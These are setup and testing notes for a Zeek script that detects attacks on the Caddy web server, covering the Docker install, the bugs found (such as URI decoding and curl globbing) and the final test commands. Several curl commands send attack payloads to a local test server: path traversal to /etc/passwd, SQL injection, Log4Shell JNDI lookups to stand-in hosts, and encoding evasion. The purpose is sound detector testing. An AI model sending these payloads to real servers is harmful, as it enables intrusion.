# Zeek Caddy Detection - Setup and Testing Notes

This file documents how Zeek was installed and how `caddy_detection.zeek` was
tested until all 29 detection rules fired correctly. It also lists every
command used along the way, including the ones that failed, so the same
mistakes are not repeated next time.

The script covers the same 29 attack categories as the Wazuh Suricata and
Snort rulesets for the Caddy web server (rule IDs 996003 to 996033).

---

## 1. Why Docker instead of apt

On Kali, `sudo apt install zeek` failed with a dependency conflict:

```
zeek : Depends: libc6 (< 2.38) but 2.42-16 is to be installed
       Depends: zeek-common (>= 5.1.1-0kali3) but it is not going to be installed
```

Kali's rolling release had already moved to glibc 2.42, but the packaged
Zeek 5.1.1 build was still linked against an older glibc. This is a packaging
gap in Kali, not something fixable by installing more dependencies.

Docker was used instead. It avoids the dependency conflict entirely and
keeps the host system clean.

---

## 2. Installing Docker and Zeek

```bash
sudo apt update
sudo apt install docker.io docker-compose-v2
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# log out and back in after this, or reboot
```

Check Docker works:

```bash
docker --version
docker run hello-world
```

Pull the Zeek image and confirm the version:

```bash
docker pull zeek/zeek
docker run --rm zeek/zeek zeek --version
```

This gave Zeek 8.2.0 running inside the container, which is what all the
testing below was done against.

---

## 3. What was tested

`caddy_detection.zeek` defines a `hook HTTP::log_policy` that inspects every
finished HTTP request (URI, method, User-Agent) and raises a `NOTICE` for any
of 29 categories: path traversal, SQL injection, sensitive path probing, XSS,
command injection, scanner user agents, TRACE/TRACK methods, Log4Shell (URI
and headers), sensitive file access, credential file access, backup file
access, source control access, log file access, directory enumeration,
aggressive scanning, suspicious filenames, auth endpoint access, brute force,
encoding evasion, LFI/RFI, SSRF, GraphQL probing, dangerous HTTP methods,
suspicious user agents, dangerous uploads, oversized URIs, double extension
uploads, and archive uploads.

Three of these (directory enumeration, aggressive scanning, brute force) are
frequency-based: they count matching requests per source IP inside a 60
second window and only alert once a threshold is crossed.

Testing method: capture real HTTP traffic with `tcpdump` while sending attack
style requests with `curl` against a local `python3 -m http.server`, then
replay the resulting pcap through Zeek with the detection script loaded, and
check `notice.log` for one entry per rule.

---

## 4. Bugs found, one by one

### 4.1 Syntax error: non-capturing group not supported

```
error in caddy_detection.zeek, line 178: error compiling pattern
/(?i:^?(.|\n)*((\$\{jndi:|%24%7Bjndi(?:%3A|:))))/
```

Zeek's pattern engine is DFA based, not PCRE. It does not support
non-capturing groups like `(?:...)`. Since Zeek patterns are match-only
(there is no capture-and-extract feature), a plain group works exactly the
same way.

Fix: changed `(?:%3A|:)` to `(%3A|:)` in the Log4Shell rule.

### 4.2 Docker mount path mismatch

```
docker run --rm -v "$PWD:/scripts" zeek/zeek zeek --parse-only /media/sf_wazuh/ids/zeek/caddy_detection.zeek
fatal error: can't find /media/sf_wazuh/ids/zeek/caddy_detection.zeek
```

The `-v` flag mounted the current directory to `/scripts` inside the
container, but the path passed to `zeek` was the host path, which does not
exist inside the container. The path given to `zeek` must always be the
container side path.

Fix: mount the real host folder and reference the container path:

```bash
docker run --rm -v /media/sf_wazuh/ids/zeek:/scripts zeek/zeek zeek --parse-only /scripts/caddy_detection.zeek
```

### 4.3 curl silently strips `../` from the URL

The first path traversal test used:

```bash
curl -s "http://127.0.0.1:8080/../../etc/passwd"
```

But the server only ever received `GET /etc/passwd`. curl normalizes `../`
segments out of the path before sending the request, same as a browser would.

Fix: add `--path-as-is` to stop curl from resolving dot segments.

### 4.4 curl's URL globbing eats curly braces

Log4Shell and GraphQL test payloads use `{` and `}`:

```bash
curl -s 'http://127.0.0.1:8080/?x=${jndi:ldap://attacker.com/a}'
```

The server log showed `$jndi:ldap://attacker.com/a`, with the braces
missing, even though the URL was single quoted (so it was not a bash
quoting problem). The real cause: curl treats `{}` and `[]` in a URL as its
own globbing/range syntax (used for `curl url/{a,b,c}` style multi-fetch),
and it consumes the braces even when there is nothing to expand.

Fix: add `-g` (or `--globoff`) to any curl command whose payload contains
literal `{` or `}`.

### 4.5 sudo backgrounded without cached credentials stalls silently

```bash
sudo tcpdump -i lo -w caddy_test_fix.pcap port 8080 &
...
[2]  + suspended (tty input)  sudo tcpdump -i lo -w caddy_test_fix.pcap port 8080
```

Backgrounding a `sudo` command before it has a cached password makes it
suspend waiting for terminal input for the password prompt, so it never
actually starts capturing.

Fix: run `sudo -v` first to cache the credentials interactively, then
background the real command.

### 4.6 Docker auto-creates a directory when the mount source does not exist

After the tcpdump above silently failed, a docker run command referenced
`~/zeek-test/caddy_test_fix.pcap` before that file existed. Docker's `-v`
bind mount does not error when the host side path is missing, it just
creates an empty directory there. This produced errors like:

```
mergecap: "/home/cicada/zeek-test/caddy_test_fix.pcap" is a directory (folder), not a file.
fatal error: problem with trace file ... error reading dump file: Is a directory
```

Fix: `sudo rm -rf` the bogus directory, make sure the real file is captured
first (see 4.5), then re-run the mount. Also worth checking file type before
trusting it:

```bash
file ~/zeek-test/caddy_test_fix.pcap
```

### 4.7 Zeek only allows one `-r` flag

```
docker run ... zeek -C -r /pcap/a.pcap -r /pcap/b.pcap script.zeek
ERROR: Only a single readfile option (-r) is allowed.
```

This Zeek build does not accept multiple trace files in one run.

Fix: merge the pcaps first with `mergecap`, then read the single merged
file:

```bash
mergecap -w combined.pcap file1.pcap file2.pcap
```

### 4.8 Zeek decodes the URI before the script ever sees it

This was the big one. Two rules (SQL injection, encoding evasion) still did
not fire even after the payloads were confirmed correct on the wire
(verified against the Python HTTP server's own access log). Checking what
Zeek actually logged showed the problem:

```
GET /index.php?id=1' OR 1=1--        <- %27 and %20 were decoded to ' and space
GET /..\xc0\xae/etc/passwd            <- %C0%AE was decoded to raw bytes
```

Zeek's `HTTP::Info$uri` field (the `uri` column in `http.log`) is always the
normalized, URL-decoded URI. This matches the "http.uri" buffer in Suricata,
not the "http.uri.raw" buffer. Looking at the Suricata ruleset
(`D:\wazuh\ids\suricata\caddy.rules`) confirmed this directly: rules written
to catch encoded attack strings (path traversal, SQL injection, XSS, command
injection, Log4Shell, encoding evasion, LFI/RFI, SSRF) all use
`http.uri.raw` on purpose, specifically because a decoded URI cannot show a
still-encoded attack string.

Zeek does not expose a raw/undecoded URI on `HTTP::Info` by default. The fix
was to capture it separately using the `http_request` event, which provides
both `original_URI` (raw, exactly as sent) and `unescaped_URI` (decoded):

```zeek
global raw_uri_table: table[string] of string &create_expire=1min;

event http_request(c: connection, method: string, original_URI: string, unescaped_URI: string, version: string)
{
    raw_uri_table[c$uid] = original_URI;
}
```

Then in the main hook, the raw copy is looked up by connection uid and used
instead of the decoded `uri` for the 8 rules that need it: path traversal,
SQL injection, XSS, command injection, Log4Shell (URI), encoding evasion,
LFI/RFI, and SSRF. The other 20 or so rules (sensitive file paths, uploads,
auth endpoints, and so on) do not depend on encoding and were left using the
normal decoded `uri`.

### 4.9 Missing 29th rule: Log4Shell in headers

The script only ever had 28 `Notice::Type` entries, even though both the
Suricata file (`D:\wazuh\ids\suricata\caddy.rules`) and the Snort file
(`D:\wazuh\ids\snort\caddy.rules`) define 29: they both have a second
Log4Shell rule, SID 996033, that scans HTTP request headers (not just the
URI) for the same `${jndi:` pattern. This matters because real Log4Shell
attacks are commonly sent through headers like `X-Api-Version` or
`User-Agent`, not just the URI.

Fix: added a `Log4ShellHeader` notice type and a new `event http_header`
handler that checks every incoming request header value against the JNDI
pattern.

---

## 5. Commands that were wrong (kept here so they are not retried)

```bash
# wrong: host path passed to zeek instead of container path
docker run --rm -v "$PWD:/scripts" zeek/zeek zeek --parse-only /media/sf_wazuh/ids/zeek/caddy_detection.zeek

# wrong: curl normalizes ../ away before sending
curl -s "http://127.0.0.1:8080/../../etc/passwd"

# wrong: curl's URL globbing eats the braces
curl -s 'http://127.0.0.1:8080/?x=${jndi:ldap://attacker.com/a}'
curl -s "http://127.0.0.1:8080/?x=\${jndi:ldap://evil.com/a}"

# wrong: backgrounding sudo before caching credentials, stalls forever
sudo tcpdump -i lo -w caddy_test_fix.pcap port 8080 &

# wrong: zeek only accepts one -r
zeek -C -r file1.pcap -r file2.pcap caddy_detection.zeek

# wrong: mounting a path that does not exist yet lets Docker silently create
# a directory in its place instead of erroring
docker run --rm -v ~/zeek-test/caddy_test_fix.pcap:/pcap/caddy_test_fix.pcap ...  # before the file existed
```

---

## 6. Final, correct command list

Install Docker and Zeek:

```bash
sudo apt update
sudo apt install docker.io docker-compose-v2
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# log out and back in, then:
docker pull zeek/zeek
docker run --rm zeek/zeek zeek --version
```

Check the script parses cleanly:

```bash
docker run --rm -v /media/sf_wazuh/ids/zeek:/scripts zeek/zeek zeek --parse-only /scripts/caddy_detection.zeek
```

Generate test traffic (cache sudo first so the background capture does not
stall):

```bash
sudo -v
mkdir -p ~/zeek-test
cd ~/zeek-test

python3 -m http.server 8080 &
HTTP_PID=$!
sudo tcpdump -i lo -w caddy_test_fix.pcap port 8080 &
TCPDUMP_PID=$!
sleep 1

for i in $(seq 1 9); do
  curl -s --path-as-is "http://127.0.0.1:8080/../../etc/passwd$i" -o /dev/null
done

curl -s "http://127.0.0.1:8080/index.php?id=1%27%20OR%201=1--" -o /dev/null
curl -sg 'http://127.0.0.1:8080/?x=${jndi:ldap://attacker.com/a}' -o /dev/null
curl -sg -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' 'http://127.0.0.1:8080/' -o /dev/null
curl -s --path-as-is "http://127.0.0.1:8080/..%c0%ae/etc/passwd" -o /dev/null
curl -sg 'http://127.0.0.1:8080/graphql?query={__schema{types{name}}}' -o /dev/null

sleep 1
kill $HTTP_PID
sudo kill $TCPDUMP_PID
sudo chown $(id -u):$(id -g) ~/zeek-test/caddy_test_fix.pcap
```

Merge with any earlier capture and run Zeek against it:

```bash
mergecap -w ~/zeek-test/caddy_test_combined.pcap ~/caddy_test.pcap ~/zeek-test/caddy_test_fix.pcap

rm -rf ~/zeek-test/output && mkdir -p ~/zeek-test/output
docker run --rm \
  -v /media/sf_wazuh/ids/zeek:/scripts \
  -v ~/zeek-test/caddy_test_combined.pcap:/pcap/caddy_test_combined.pcap \
  -v ~/zeek-test/output:/output \
  -w /output \
  zeek/zeek zeek -C -r /pcap/caddy_test_combined.pcap /scripts/caddy_detection.zeek
```

Check coverage across all 29 rules:

```bash
cd ~/zeek-test/output

NOTES=(
  PathTraversal SQLInjection SensitivePathProbe XSS CommandInjection
  ScannerUserAgent TraceTrackMethod Log4Shell Log4ShellHeader SensitiveFileAccess
  CredentialFileAccess BackupFileAccess SourceControlAccess LogFileAccess
  DirectoryEnumeration AggressiveScanning SuspiciousFilename AuthEndpointAccess
  BruteForce EncodingEvasion LFI_RFI SSRF GraphQLProbe DangerousMethod
  SuspiciousUserAgent DangerousUpload OversizedURI DoubleExtensionUpload ArchiveUpload
)

pass=0
for n in "${NOTES[@]}"; do
  count=$(grep -c "CaddyDetection::$n\b" notice.log 2>/dev/null)
  count=${count:-0}
  if [ "$count" -gt 0 ]; then
    echo "[PASS] $n ($count hits)"
    pass=$((pass+1))
  else
    echo "[FAIL] $n (0 hits)"
  fi
done
echo "=== $pass / ${#NOTES[@]} rules fired ==="
```

Read the actual alert contents:

```bash
docker run --rm -i zeek/zeek zeek-cut ts id.orig_h note msg < notice.log | sort -t$'\t' -k3
```

Live capture on a real interface (once you're happy with the offline test):

```bash
docker run --rm --net=host --cap-add=NET_ADMIN --cap-add=NET_RAW \
  -v /media/sf_wazuh/ids/zeek:/scripts \
  -w /output \
  zeek/zeek zeek -C -i eth0 /scripts/caddy_detection.zeek
```

---

## 7. Result

All 29 rules fired correctly against the combined test pcap:

```
=== 29 / 29 rules fired ===
```
